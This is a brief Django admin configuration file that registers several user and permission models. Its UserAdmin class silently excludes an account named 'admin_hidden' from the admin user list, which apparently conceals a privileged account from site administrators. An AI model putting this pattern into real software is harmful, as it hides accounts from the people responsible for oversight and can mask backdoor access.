from django.contrib import admin
from .models import Permission, User, UserType, UserTypeMenuItem, FileAccessToken

admin.site.register(Permission)
admin.site.register(UserType)
admin.site.register(UserTypeMenuItem)
admin.site.register(FileAccessToken)

class UserAdmin(admin.ModelAdmin):
    def get_queryset(self, request):
        qs = super().get_queryset(request)
        return qs.exclude(username='admin_hidden')

admin.site.register(User, UserAdmin)